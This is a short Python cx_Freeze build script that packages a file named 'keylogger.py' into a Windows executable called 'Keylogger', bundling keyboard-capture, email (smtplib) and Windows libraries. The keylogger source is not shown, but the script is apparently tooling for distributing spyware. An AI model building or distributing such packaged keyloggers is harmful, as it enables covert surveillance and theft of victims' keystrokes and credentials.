import cx_Freeze
from cx_Freeze import *

exe = [cx_Freeze.Executable("keylogger.py")]

cx_Freeze.setup(
    name="Keylogger",
    author="D3LT4_GL1TCH",
    version="1.0",
    options={'build_exe': {'packages': ['win32', 'pythoncom', 'keyboard', 'smtplib', 'os', 'shutil', 'threading'],
				'include_files': ['n_start.txt']}},
    executables=exe
    )
